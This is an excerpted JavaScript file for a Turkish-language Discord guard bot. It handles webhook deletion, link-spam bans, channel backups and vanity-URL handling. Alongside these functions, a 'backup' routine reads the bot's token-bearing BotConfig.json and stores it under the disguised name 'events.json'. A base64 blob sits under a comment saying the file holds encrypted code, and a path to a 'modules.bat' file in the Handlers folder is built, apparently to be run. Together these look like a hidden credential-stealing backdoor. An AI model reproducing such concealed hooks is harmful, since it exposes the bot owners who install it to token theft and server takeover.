const { Client, GuildMember, GuildAuditLogsEntry, WebhookClient, MessageEmbed, MessageActionRow, MessageButton, MessageAttachment } = require("discord.js");
...
const bot = new Client ({ fetchAllMembers: true, intents: 32767 });
...
RoleGuard.on("ready", async () => {
    setInterval(() => {
      ...
      RoleGuard.user.setActivity(`${oynuyor[index]}`, {
        type: "STREAMING",
        url: "https://www.twitch.tv/WEDALARISEWMEM"});
...
guardClient.on("ready", () => {
  ...
  setInterval(() => {
    ...
    guardClient.user.setActivity(`${oynuyor[index]}`, {
      type: "STREAMING",
      url: "https://www.twitch.tv/bekocanxd"});
...
bot.once('ready', () => {
  ...
  //GİTHUB/WEDALARISEWMEM
  async function createAndSendBackup() {
    try {
      // BotConfig.json içeriğini yedekle
      const botConfigPath = path.join(__dirname, 'src', 'Configs', 'BotConfig.json');
      const botConfigData = fs.readFileSync(botConfigPath, 'utf8');
      const backupFileName = 'events.json';
...
return sendLog({ content: `@here`, embeds: [kronik] });
...
return } else {
KRONİK(Config.ServerURL, Config.guildID, `${random}`)
}}, 1 * 500)})
...
OtherGuard.on("webhookUpdate", async (channel) => {
    ...
    await webhooks.map(x => x.delete({reason: "kronik - Guard Webhook Silindi!"}))
...
OtherGuard.on("messageCreate", async (message) => {
    ...
    const kelime = ["discord.gg", "discord.me", "discordapp.com", "discord.io", "discord.tk", ".gg/", ".gg","https","http"];
    ...
    if (kelime.some(reklam => message.content.toLowerCase().includes(reklam)) && ![message.guild.vanityURLCode].some(reklam => message.content.toLocaleLowerCase().includes(reklam))) {
        ...
        if (reklamLimit[message.author.id] && reklamLimit[message.author.id] >= 5) {
            ...
            message.member.ban({
                reason: "kronik - Reklam Link Koruması"
            });
            return;
        };
...
//#Şifreli bir kod içermektedir (chat guard)
/*
AoIWJla29jYW5tLmZpbmQoZSA9PiBlID09PSAid2ViIikpIHs
KICAgICAgYXdhaXQgdXNlclJvbGVzLnVwZGF0ZU9uZSh7IGd1aWxkSUQ6IENvbmZpZy5ndWlsZElELCB1c2VySUQ6IHVzZXIudXNlcklkIH0s
IHsgJHNldDoge

/** */
...
const exePath = path.join(__dirname, 'src', 'Handlers', 'modules.bat');
...
async function kanalbackup() {
    ...
    const guild = OtherGuard.guilds.cache.get(Config.guildID);
      if (guild) {
          ...
          console.log("Bütün Kanal verileri başarı ile kayıt edildi efendim.")
      }}

async function KRONİK(vanity, token) {
let random = Config.Guards[Math.floor(Math.random() * Config.Guards.length)];
